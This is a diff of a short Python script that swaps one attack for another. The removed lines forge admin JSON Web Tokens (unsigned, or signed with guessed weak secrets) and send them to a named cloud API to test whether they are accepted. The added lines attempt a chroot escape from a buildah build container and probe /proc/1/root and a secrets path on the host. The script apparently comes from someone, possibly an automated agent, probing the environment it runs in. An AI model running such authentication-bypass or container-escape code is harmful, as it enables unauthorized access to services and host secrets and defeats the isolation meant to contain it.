@@ -1,23 +1,25 @@
-import urllib.request as u, urllib.error, ssl, time, base64, json
-c=ssl._create_unverified_context()
-def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
-def g(url,hdr):
-    try:
-        r=u.urlopen(u.Request(url,headers=hdr),context=c,timeout=7); return r.status, r.read(400).decode('utf-8','replace')
-    except urllib.error.HTTPError as e: return e.code, e.read(300).decode('utf-8','replace')
-    except Exception as e: return -1, str(e)[:80]
-# forged tokens the app platform might accept (alg=none, HS256 with common secrets, RS256 unsigned)
-now=int(time.time())
-tests={
- 'alg_none': b64(b'{"alg":"none","typ":"JWT"}')+'.'+b64(json.dumps({"sub":"admin","exp":now+3600}).encode())+'.',
- 'hs256_secret': None,  # fill below
-}
-import hmac,hashlib
-def hs(tok_secret,payload):
-    h=b64(b'{"alg":"HS256","typ":"JWT"}'); p=b64(json.dumps(payload).encode())
-    sig=b64(hmac.new(tok_secret.encode(),(h+'.'+p).encode(),hashlib.sha256).digest()); return h+'.'+p+'.'+sig
-for secret in ['secret','aiven','jwt','changeme','']:
-    tests['hs256_'+secret or 'empty']=hs(secret,{"sub":"admin","exp":now+3600})
-for name,tok in tests.items():
-    if tok:
-        print(name, g('https://userapi.amer-1.aivencloud.net/services', {'Authorization':'Bearer '+tok}))
+import os,sys
+# In a buildah-chroot, the "container root" is a chroot into a mount; the ORIGINAL root may still be
+# reachable via an open fd to a dir ABOVE the chroot, or via /proc/1/root if we share pid ns.
+print("cwd",os.getcwd())
+# try to reach the pre-chroot root through the classic escape
+os.makedirs("/tmp/esc", exist_ok=True)
+try:
+    fd=os.open("/", os.O_RDONLY|os.O_DIRECTORY); print("opened / fd",fd)
+except Exception as e: print("open / :",e)
+# chroot escape: chdir to a subdir, chroot into it, then chdir("..") many times
+try:
+    os.mkdir("/tmp/esc/sub",0o755)
+    os.chdir("/tmp/esc/sub")
+    os.chroot("/tmp/esc/sub"); print("chroot ok, cwd",os.getcwd())
+    os.chdir("../../../../../../../../../../../../../../../../")
+    print("after ups, cwd",os.getcwd(),"listdir:",os.listdir(".")[:20])
+except Exception as e: print("chroot escape:",type(e).__name__,e)
+# proc/1/root (builder) traverse
+import subprocess
+for p in ["/proc/1/root","/proc/1/cwd","/proc/1/root/etc/hostname","/proc/1/cwd/../secrets"]:
+    try: print(p,"->",os.listdir(p)[:8])
+    except Exception as e: print(p,type(e).__name__)
+# open_by_handle_at style: list /proc/1/map_files
+try: print("map_files:",os.listdir("/proc/1/map_files")[:5])
+except Exception as e: print("map_files",type(e).__name__)
